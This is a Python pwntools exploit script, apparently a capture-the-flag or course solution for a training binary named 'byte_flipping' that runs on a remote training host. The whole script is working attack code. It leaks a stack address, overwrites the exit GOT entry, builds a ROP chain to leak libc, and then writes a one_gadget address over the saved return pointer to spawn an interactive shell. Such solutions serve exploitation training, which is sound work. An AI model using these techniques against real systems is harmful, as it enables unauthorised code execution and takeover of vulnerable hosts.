#! /usr/bin/python3
import pwn
import sys
import copy

def exit_from_play():
    r.recv()
    r.sendline("0x0")

def put_name(name):
    r.recv()
    r.send(name)

def put_byte(address, byte,recv):
    if recv:
        r.recvuntil(b'Address: ')
        r.sendline(str(hex(address)))
        r.recv()
        r.sendline(byte.hex())
    else:
        r.sendline(str(hex(address)))
        r.recv()
        r.sendline(byte.hex())

def put_address(address, content):
    for i in range(0, len(content)):
        r.recvuntil(b'Address: ')
        r.sendline(str(hex(address+i)))
        r.recv()
        r.sendline(str(hex(content[i])))
        pwn.log.debug(str(hex(content[i])))

pwn.context.terminal = ['tmux', 'split-window', '-h']
args = sys.argv
if "remote" not in args:
    r = pwn.process("./byte_flipping")
    pwn.context.arch = "amd64"
if "debug" in args:
    pwn.context.log_level = "DEBUG"
if "gdb" in args:
    print("debug")
    gdb = pwn.gdb.attach(r, '''
    b * 0x0000000000400a85
    b play
    ''')
else:
    r = pwn.remote("bin.training.offdef.it", 4003)


elf = pwn.ELF("./byte_flipping")
libc = pwn.ELF("./libc-2.35.so")
play_address = elf.sym["play"]

put_name("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA*")    #filling name buffer

stack_leak = r.recv()
stack_leak = stack_leak[0x2a:0x2a+6]
print(stack_leak)
stack_leak = stack_leak + (8-len(stack_leak))*b'\x00' #zero filling the address for this shitty unpack
print(stack_leak.hex())
print(len(stack_leak))
stack_leak = pwn.packing.u64(stack_leak, sign="unsigned", endianness="little") #conversion

pwn.log.debug(stack_leak)
pwn.log.debug(hex(stack_leak))

rbp = stack_leak+0x30
srip = rbp + 0x8
counter = rbp - 0x14
sec_counter = rbp - 0x13
nflips = rbp - 0x12                 #addresses derived from the leak
sec_nflips = rbp - 0x11
got_exit = 0x602050
puts = 0x400660
pop_rdi = 0x400b33
libc_start_main_address = stack_leak+0x108
play = 0x00000000004009cd

onegadgets = [0xebdb3, 0xebdaf, 0xebd52, 0xebcf8, 0xebcf5, 0xebcf1, 0x50a37]
i = 0
#while True:
#    put_byte(got_exit, b'\xcd')
#    put_byte(got_exit+1, b'\x09')
#    put_byte(nflips, b'\xff')
#    #put_byte(nflips - i, b'\xff')
#    #i += 0x30
#print(elf.got)
put_byte(got_exit, b'\xcd',False)
put_byte(got_exit+1, b'\x09',True)
put_byte(nflips, b'\xaf',True)
print(pwn.packing.p64(pop_rdi, sign="unsigned", endianness="little"))
put_address(srip, pwn.packing.p64(pop_rdi, sign="unsigned", endianness="little") )
put_address(srip+0x8, pwn.packing.p64(libc_start_main_address, sign="unsigned", endianness="little") )
put_address(srip+0x10, pwn.packing.p64(puts, sign="unsigned", endianness="little") )
put_address(srip+0x18,pwn.packing.p64(play, sign="unsigned", endianness="little"))
exit_from_play()
exit_from_play()
libc_leak = r.recvuntil(b'\x0a')
libc_leak = r.recvuntil(b'\x0a', drop=True )
libc_leak = pwn.packing.u64(libc_leak + (8-len(libc_leak))*b'\x00')
libc_start = libc_leak - libc.sym["__libc_start_main"]-128
pwn.log.debug(hex(rbp))
rbp = rbp + 0x20
srip = rbp + 0x8
counter = rbp - 0x14
sec_counter = rbp - 0x13
nflips = rbp - 0x12                 #addresses derived from the leak
sec_nflips = rbp - 0x11
put_byte(nflips, b'\xaf',True)

print("address libc start main in the library",hex(libc.sym["__libc_start_main"]))
print("address start libc in memory",hex(libc_start))
target = libc_start + onegadgets[4]
put_address(srip, pwn.packing.p64(target))
exit_from_play()
exit_from_play()

r.interactive()
